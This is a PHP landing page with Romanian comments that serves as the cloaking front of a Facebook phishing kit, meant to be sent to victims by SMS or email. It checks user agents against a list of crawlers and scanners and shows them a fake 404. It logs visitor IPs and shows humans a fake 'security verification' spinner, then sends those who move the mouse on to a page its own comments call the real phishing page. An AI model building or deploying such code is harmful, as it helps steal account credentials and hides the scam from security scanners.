<?php
// landing.php - Acesta este linkul pe care îl trimiți în SMS/email
// Verifică dacă vizitatorul este bot sau om

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

// Listă de user-agente cunoscute de boți
$bot_keywords = ['bot', 'crawl', 'spider', 'scraper', 'curl', 'wget', 
                 'python', 'java', 'httpclient', 'headless', 'puppeteer', 
                 'selenium', 'phantom', 'googlebot', 'bingbot', 'slurp',
                 'facebookexternalhit', 'linkedinbot', 'twitterbot'];

$is_bot = false;
foreach ($bot_keywords as $keyword) {
    if (stripos($user_agent, $keyword) !== false) {
        $is_bot = true;
        break;
    }
}

// Loghează toate vizitele (pentru demo)
$log = date('Y-m-d H:i:s') . " | IP: $ip | UA: $user_agent | Bot: " . ($is_bot ? 'YES' : 'NO') . PHP_EOL;
file_put_contents('visits.log', $log, FILE_APPEND);

// Dacă e bot, arată o pagină falsă (404 Not Found)
if ($is_bot) {
    http_response_code(404);
    echo '<!DOCTYPE html>
    <html>
    <head><title>404 Page Not Found</title></head>
    <body>
    <h1>404 - Page Not Found</h1>
    <p>The requested page could not be found.</p>
    </body>
    </html>';
    exit;
}

// Dacă nu e bot cunoscut, verifică JavaScript
?>

<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <title>Verificare securitate</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1877f2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="loadingDiv">
        <h2>🔐 Verificare securitate</h2>
        <div class="spinner"></div>
        <p>Verificam conexiunea ta...</p>
        <p style="font-size: 12px; color: #666;">Aceasta operatiune dureaza cateva secunde.</p>
    </div>

    <div class="container hidden" id="errorDiv">
        <h2 style="color: #e41e3f;">❌ Eroare</h2>
        <p>JavaScript este dezactivat in browserul tau.</p>
        <p>Pentru a continua, activeaza JavaScript.</p>
    </div>

    <script>
        // Salvează timestamp-ul
        const pageLoadTime = Date.now();
        
        // Verifică mouse movement
        let mouseMoved = false;
        document.addEventListener('mousemove', function() {
            mouseMoved = true;
        });
        
        // Așteaptă 2 secunde apoi redirecționează
        setTimeout(function() {
            if (!mouseMoved) {
                // Fără mouse movement? Poate e bot
                document.getElementById('loadingDiv').classList.add('hidden');
                document.getElementById('errorDiv').classList.remove('hidden');
                return;
            }
            
            // Generează un token unic
            const token = Date.now() + '_' + Math.random().toString(36).substr(2, 16);
            
            // Redirecționează către pagina reală de phishing CU token
            window.location.href = 'fbpage.php?token=' + token + '&verify=' + pageLoadTime;
        }, 2000);
    </script>
    
    <noscript>
        <meta http-equiv="refresh" content="0; url=https://www.facebook.com">
    </noscript>
</body>
</html>